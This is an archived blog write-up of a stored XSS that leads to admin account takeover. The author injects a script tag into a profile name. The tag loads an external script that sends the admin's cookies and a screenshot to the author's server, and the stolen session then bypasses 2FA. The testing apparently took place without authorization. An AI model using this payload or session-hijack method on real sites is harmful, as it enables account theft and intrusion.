# Full Account Takeover via XSS

- **Source URL:** https://mushirsyed.medium.com/full-account-takeover-via-xss-my-bug-hunting-win-or-was-it-3b3fb05c25a9?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250322165435/https://mushirsyed.medium.com/full-account-takeover-via-xss-my-bug-hunting-win-or-was-it-3b3fb05c25a9?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/9114 (id 9114)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Full Account Takeover via XSS: My Bug Hunting Win… or Was It?

Hi, I’m Syed Mushir, 17. This is my first post. Last month I identified a XSS vulnerability in a website. I will keep this short. Let’s get started.

# Finding the Vulnerability

I visited the website and made an account on it. First i tried finding the admin panel of the website. I got a subdomain called “**admin0087.target.com**” (used subdomain finder by c99.nl), I visited the subdomain, I landed on the login page which had three input fields “**Username,Password,Code”.** By inspecting the elements i got the id of the code element as “**googlecode**” which means the panel was 2 factor authenticated. So bruteforcing was a very bad idea.

# Exploiting XSS

Now i opened the user panel (the one on which i made an account). There were lots of pages, I saw a page called “**Settings**” where we can update our basic info like name and stuff. I casually tried adding this to my name

`" onfocus='alert(1)'`
& boom i saw that they do not filter and sanitize the user input.

I wrote a script that steals cookies,the current url and send it to my server & a screenshot of the current page using html2canvas ([Reference](https://web.archive.org/web/20250322165435/http://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas)) and changed my name to

`My Name<script src='https://mydomain.com/mine.js'>`
where mine.js was that script.

Now i was waiting if the admin would login to the panel to see the registered users and after an hour or so it happened. He logged into the panel opened a page where there was a table of registered users. A request to my server was sent that saved the cookies, current url and the screenshot and i was notified on telegram (I used the telegram bot api).

I modified the cookies using an extension in Firefox and refreshed the login page on **admin0087.target.com.** Boom! i was logged in. I got access to the website’s admin panel without having credentials and access to the 2FA code.

# **Why did this happen?**

- User Input Not Validated
- User Input Not Filtered & Sanitized
- Cookies were not set to HttpOnly;

# **What did i do next?**

I contacted the website owners, I showed them the proof & told them about the bug. I politely asked them for a bug bounty for which they denied and verbally abused me. They fixed the bug in 2 days, Yes! two days, for the two days they were on maintenance.

Thanks for reading! This was my first post, and I apologize for any mistakes. Despite the bad experience, I’m still passionate about bug hunting and learning more every day.
